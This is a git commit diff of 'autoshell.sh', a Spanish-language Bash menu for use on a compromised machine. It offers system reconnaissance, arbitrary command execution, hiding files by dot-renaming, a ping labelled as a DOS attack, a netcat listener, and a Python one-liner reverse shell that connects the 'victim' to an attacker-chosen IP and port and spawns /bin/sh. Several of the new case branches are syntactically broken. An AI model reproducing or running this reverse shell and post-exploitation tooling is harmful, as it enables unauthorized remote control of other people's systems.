0a32ddcdbbc2d1f6b9b07e04856f9254b710ea5a
Aaron-AOH <118374763+Aaron-AOH@users.noreply.github.com>
2022-12-19 12:42:48 +0100

    Update autoshell.sh

--- autoshell.sh
+++ autoshell.sh
@@ -12,37 +12,40 @@ do
 	
 	echo -e "
 	
-	$(tput setaf 2)View Info       	command			hacking 		
+	$(tput setaf 2)
+	View Info       	command			hacking 		
 	
 	$(tput setaf 7)
-	1 = kernel	        8 = ls			20 = portforwarding
-	2 = info_cpu		9 = comando manual
-	3 = whoami		10 = pwd
-	4 = info hardware	11 = clear
-	5 = view users
-	6 = view version OS
-	7 = view IP		99 = exit
+	1 = kernel	        7 = ls			15 = portforwarding
+	2 = info_cpu		8 = comando manual	16 = ocultar archivos
+        3 = info hardware	9 = pwd			17 = atack DOS
+	4 = view users		10 = clear		18 = listener netcat
+	5 = view version OS	11 = whoami	
+	6 = view IP
+				99 = exit menu
 "
-read -p "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar > $(tput setaf 7) " option 
+echo "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar >" $(tput setaf 7) " && read -p "> " option
 
 	      
 	case $option in  
 
      		99) exit ;;
-		10) pwd ;;  	
-		8) ls ;;
-		7) ifconfig ;;
+		9) pwd ;;  	
+		7) ls ;;
+		6) ifconfig ;;
 		1) uname -a ;;
 		2) lscpu ;;
-		9) read -p "Introzca comando manualmente > " comando && $comando ;;
-		3) whoami ;;
-		4) dmidecode ;;
-		5) who -a ;;
-		6) cat /proc/version ;;
-		11) clear ;;
-		20) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && echo "Escriba el puerto al que quieres reedirigir la sesion" && read -p "> " puerto && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-
+		8) echo "Introzca comando manualmente > " read -p "> " comando && $comando ;;
+		11) whoami ;;
+		3) dmidecode ;;
+		4) who -a ;;
+		5) cat /proc/version ;;
+		10) clear ;;
+		15) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && echo "Escriba el puerto al que quieres reedirigir la sesion" && read -p "> " puerto && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+		16) echo "escribe el nombre del archivo que quiere ocultar> " read -p "> " hidden  && mv $hidden "."$hidden
+		17) echo "Introduzca la IP que realizará ping la maquina victima > " read -p "> " ping && ping $ping
+		18) apt-get install netcat && echo "Introduzca el puerto de escucha > " read -p "> " listener && nc -nlvp $listener
+		
 	esac
 done 
 
